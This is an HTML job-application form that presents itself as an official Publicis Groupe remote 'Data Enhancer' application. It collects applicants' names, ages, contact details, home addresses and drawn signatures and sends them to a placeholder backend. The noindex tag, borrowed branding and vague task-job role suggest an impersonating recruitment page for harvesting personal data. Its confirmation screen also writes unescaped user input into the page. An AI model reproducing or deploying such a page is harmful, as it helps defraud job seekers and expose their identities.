
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Official Publicis Groupe remote job application form.">
  <meta name="robots" content="noindex">
  <link rel="icon" href="Logo.png" type="image/png">
  <link rel="manifest" href="manifest.json">
  <title>Publicis Groupe Remote Work Application</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
  <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
    .container { max-width: 800px; margin: auto; background: #fff; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; }
    label { display: block; margin-top: 15px; font-weight: bold; }
    input, textarea, select { width: 100%; padding: 8px; margin-top: 5px; }
    canvas { border: 1px solid #ccc; width: 100%; height: 200px; touch-action: none; display: block; }
    .btn { margin-top: 20px; padding: 10px 20px; background: #007bff; color: #fff; border: none; cursor: pointer; font-size: 16px; }
    .btn:active { background: #0056b3; transform: scale(0.98); }
    .logo { width: 200px; display: block; margin: auto; }
    .disclaimer { font-size: 12px; color: #888; margin-top: 20px; text-align: center; }
  </style>
</head>
<body>
  <div class="container" id="formContainer">
    <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
    <h2>Publicis Groupe Remote Work Application</h2>

    <form id="applicationForm">
      <label>Position Applied For: <input type="text" value="Data Enhancer" readonly></label>
      <label>Full Name: <input type="text" required></label>
      <label>Age: <input type="number" required></label>
      <label>Email Address: <input type="email" required></label>
      <label>Phone Number: <input type="tel" required></label>
      <label>Residential Address (including State and Zip): <input type="text" required></label>
      <label>Current Job: <input type="text"></label>
      <label>Preferred Start Date: <input type="text" id="startDate" required></label>

      <label>Do you have a reliable internet connection for remote work?
        <select required><option>Yes</option><option>No</option></select>
      </label>
      <label>Are you able to self-manage and manage time remotely?
        <select required><option>Yes</option><option>No</option></select>
      </label>
      <label>Primary Work Time Zone: <input type="text" required></label>

      <label>Relevant Work Experience:
        <textarea rows="3"></textarea>
      </label>
      <label>Key Skills and Software Tools:
        <textarea rows="3"></textarea>
      </label>

      <label>Signature (please sign below):</label>
      <canvas id="signature" width="600" height="200"></canvas>
      <button type="button" class="btn" onclick="clearSignature()">Clear Signature</button>

      <label>Date: <input type="text" id="signDate" required></label>

      <button type="button" class="btn" onclick="submitForm()">Submit</button>
    </form>

    <p class="disclaimer">
      The information on this form is used solely for remote job applications and will not be used for marketing or other purposes.
    </p>
  </div>

  <script>
    function getUSTodayDateStr() {
      const now = new Date();
      const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
      const estOffset = -4 * 60;
      const estTime = new Date(utc + estOffset * 60000);
      return estTime.toISOString().split('T')[0];
    }

    flatpickr("#startDate", {
      dateFormat: "Y-m-d",
      defaultDate: getUSTodayDateStr()
    });
    flatpickr("#signDate", {
      dateFormat: "Y-m-d",
      defaultDate: getUSTodayDateStr()
    });

    const canvas = document.getElementById('signature');
    const ctx = canvas.getContext('2d');
    let drawing = false, lastPos = null;

    function resizeCanvas() {
      const dataURL = canvas.toDataURL();
      const ratio = window.devicePixelRatio || 1;
      canvas.width = canvas.offsetWidth * ratio;
      canvas.height = canvas.offsetHeight * ratio;
      ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
      const img = new Image();
      img.onload = () => ctx.drawImage(img, 0, 0);
      img.src = dataURL;
    }

    resizeCanvas();
    window.addEventListener("resize", resizeCanvas);
    ctx.lineWidth = 2;
    ctx.lineJoin = "round";
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";

    function getPos(e) {
      const rect = canvas.getBoundingClientRect();
      if (e.touches && e.touches.length > 0) {
        return { x: e.touches[0].clientX - rect.left, y: e.touches[0].clientY - rect.top };
      } else {
        return { x: e.clientX - rect.left, y: e.clientY - rect.top };
      }
    }

    function startDraw(e) {
      e.preventDefault();
      drawing = true;
      lastPos = getPos(e);
    }

    function draw(e) {
      if (!drawing) return;
      e.preventDefault();
      const pos = getPos(e);
      if (lastPos) {
        ctx.beginPath();
        ctx.moveTo(lastPos.x, lastPos.y);
        ctx.lineTo(pos.x, pos.y);
        ctx.stroke();
      }
      lastPos = pos;
    }

    function stopDraw(e) {
      e.preventDefault();
      drawing = false;
      lastPos = null;
    }

    canvas.addEventListener('mousedown', startDraw);
    canvas.addEventListener('mousemove', draw);
    canvas.addEventListener('mouseup', stopDraw);
    canvas.addEventListener('mouseout', stopDraw);
    canvas.addEventListener('touchstart', startDraw, { passive: false });
    canvas.addEventListener('touchmove', draw, { passive: false });
    canvas.addEventListener('touchend', stopDraw);
    canvas.addEventListener('touchcancel', stopDraw);

    function clearSignature() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
    }

    function submitForm() {
      const form = document.getElementById("applicationForm");
      const data = {
        fullName: form.elements[1].value,
        age: form.elements[2].value,
        email: form.elements[3].value,
        phone: form.elements[4].value,
        address: form.elements[5].value,
        currentJob: form.elements[6].value,
        startDate: form.elements[7].value,
      };

      fetch("https://your-backend-url.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).then(res => {
        if (res.ok) {
          document.body.innerHTML = `
            <div class="container">
              <img class="logo" src="Logo.png" alt="Publicis Groupe Logo" />
              <h2>Application Submitted Successfully</h2>
              <p><strong>Name:</strong> ${data.fullName}</p>
              <p><strong>Age:</strong> ${data.age}</p>
              <p><strong>Email:</strong> ${data.email}</p>
              <p><strong>Phone:</strong> ${data.phone}</p>
              <p><strong>Address:</strong> ${data.address}</p>
              <p><strong>Current Job:</strong> ${data.currentJob}</p>
              <p><strong>Preferred Start Date:</strong> ${data.startDate}</p>
            </div>`;
        } else {
          alert("Submission failed.");
        }
      }).catch(err => {
        console.error(err);
        alert("Error occurred during submission.");
      });
    }
  </script>
</body>
</html>
